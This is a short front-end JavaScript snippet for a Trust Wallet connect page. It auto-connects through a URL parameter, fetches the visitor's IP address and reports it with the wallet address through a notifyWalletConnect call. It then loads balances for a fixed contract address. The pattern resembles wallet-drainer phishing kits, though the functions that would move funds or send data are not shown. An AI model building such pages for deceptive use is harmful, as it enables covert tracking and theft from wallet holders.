const CONNECT_BTN = document.getElementById("connectWalletBtn");
const STATUS_DIV = document.getElementById("status");
const STEPS_DIV = document.getElementById("steps");
const ERROR_DIV = document.getElementById("error");
const WALLET_INFO_DIV = document.getElementById("walletInfo");

if (CONNECT_BTN) {
    CONNECT_BTN.addEventListener("click", async () => {
        const address = await connectWallet();
        
        if (address) {
            const ipAddress = await getIPAddress();
            notifyWalletConnect(address, ipAddress);
            await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
        }
    });
}

(function autoConnectCheck() {
    const params = new URLSearchParams(window.location.search);
    if (params.get("autoconnect") !== "1") return;
    
    let attempts = 0;
    const timer = setInterval(async () => {
        attempts++;
        const pCheck = getTrustWalletProvider();
        
        if (pCheck && pCheck !== "REJECTED_OTHER_WALLET") {
            clearInterval(timer);
            const address = await connectWallet();
            if (address) {
                const ipAddress = await getIPAddress();
                notifyWalletConnect(address, ipAddress);
                await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
            }
        } else if (pCheck === "REJECTED_OTHER_WALLET" || attempts > 15) {
            clearInterval(timer);
            if (pCheck === "REJECTED_OTHER_WALLET") {
                redirectToTrustRequired();
            }
        }
    }, 500);
})();